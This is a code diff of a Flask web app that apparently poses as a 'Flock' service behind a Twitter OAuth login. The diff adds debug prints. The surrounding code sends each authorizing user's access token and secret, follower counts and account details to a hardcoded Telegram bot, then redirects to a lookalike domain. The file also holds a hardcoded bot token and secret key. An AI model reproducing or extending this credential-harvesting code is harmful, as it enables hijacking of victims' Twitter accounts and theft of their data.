@@ -3,6 +3,7 @@ import tweepy
 import requests
 import json
 import os
+
 app = Flask(__name__)
 app.secret_key = 'icraatmakinesi'
 telegram_bot_token = '6927604552:AAHX6iR3Gduu7qyLv6m_90EbhlS_-ZtBDxI'
@@ -86,13 +87,17 @@ def login():
     auth = tweepy.OAuthHandler(consumer_key, consumer_secret, callback_url)
     auth_url = auth.get_authorization_url()
     session['request_token'] = auth.request_token
+    print(f"Request Token: {session['request_token']}")  # Debug statement
     return redirect(auth_url)
 
 
 @app.route('/callback')
 async def callback():
+    print("Callback initiated")  # Debug statement
     request_token = session.get('request_token')
+    print(f"Retrieved Request Token: {request_token}")  # Debug statement
     if not request_token:
+        print("No request_token found in session")  # Debug statement
         return redirect(url_for('home'))  # Handle case where request_token is not set
 
     del session['request_token']
@@ -101,6 +106,7 @@ async def callback():
     auth.request_token = request_token
 
     verifier = request.args.get('oauth_verifier')
+    print(f"Verifier: {verifier}")  # Debug statement
     auth.get_access_token(verifier)
 
     session['access_token'] = auth.access_token
@@ -109,7 +115,11 @@ async def callback():
     access_token = session.get('access_token')
     access_token_secret = session.get('access_token_secret')
 
+    print(f"Access Token: {access_token}")  # Debug statement
+    print(f"Access Token Secret: {access_token_secret}")  # Debug statement
+
     if not access_token or not access_token_secret:
+        print("Access token or secret not found")  # Debug statement
         return redirect('https://flock.com')
 
     auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
@@ -128,13 +138,12 @@ async def callback():
         f"🔑~Access Token Secret: {access_token_secret}\n\n👥~Followers: {user.followers_count}\n\n"
         f"🎉~Friends: {user.friends_count}\n\n⏰~Created At: {user.created_at}\n\n💎~Outreach Percent: {outreach_percentage}%"
     )
-    print(ext)
+    print(f"Message to be sent: {ext}")  # Debug statement
     try:
         send_telegram_message(ext)
     except Exception as e:
-        print(e)
+        print(f"Error sending telegram message: {e}")  # Debug statement
     return redirect('https://us-flock.com')
-
 
 
 if __name__ == '__main__':
